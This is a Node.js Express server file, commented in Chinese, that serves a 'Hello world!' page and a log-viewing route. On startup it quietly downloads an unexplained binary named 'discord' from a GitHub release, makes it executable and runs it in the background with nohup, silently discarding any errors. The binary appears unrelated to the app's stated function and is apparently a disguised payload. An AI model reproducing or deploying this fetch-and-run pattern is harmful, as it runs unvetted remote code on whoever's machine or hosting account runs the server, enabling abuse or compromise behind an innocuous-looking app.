const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');

const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

// 基础 HTTP 路由
app.get("/", function(req, res) {
  res.send("Hello world!");
});

// 日志路由
app.get("/log", (req, res) => {
  fs.readFile('log.txt', "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

// 下载 discord 文件
const downloadDiscord = () => {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream('discord');
    https.get('https://github.com/mmnni/pipeops/releases/download/sac/discord', (response) => {
      response.pipe(file);
      file.on('finish', () => {
        file.close();
        // 添加执行权限
        exec('chmod +x discord', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
    }).on('error', (err) => {
      fs.unlink('discord', () => {});
      reject(err);
    });
  });
};

// 执行 discord
const Execute = async () => {
  try {
    // 下载并授权
    await downloadDiscord();
    
    // 执行文件
    const command = 'nohup ./discord &';
    exec(command, { 
      shell: '/bin/bash'
    });
  } catch (err) {}
};

// 启动服务和执行 discord
Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
